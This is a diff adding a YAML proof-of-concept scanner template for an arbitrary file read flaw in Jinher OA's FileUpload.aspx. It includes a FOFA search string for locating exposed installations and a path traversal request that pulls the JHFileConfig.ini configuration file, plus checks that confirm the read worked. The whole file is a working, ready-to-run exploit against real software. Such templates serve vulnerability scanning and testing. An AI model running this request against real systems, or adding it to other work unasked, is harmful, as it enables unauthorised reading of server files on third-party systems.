@@ -1,0 +1,26 @@
+id: poc-yaml-jinher-fileupload-aspx-anyfile-read
+info:
+  name: 金和OA FileUpload.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /c6/jhsoft.wcf/functionnew/FileUpload.aspx?FileName=../../Resource/JHFileConfig.ini
+  expression: 'status_code == 200 &&
+
+    contains(body,"[JHFile]") &&
+
+    contains(body,"FolderTotal=") &&
+
+    contains(headers,"filename=") &&
+
+    contains(content_type,"application/octet-stream") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
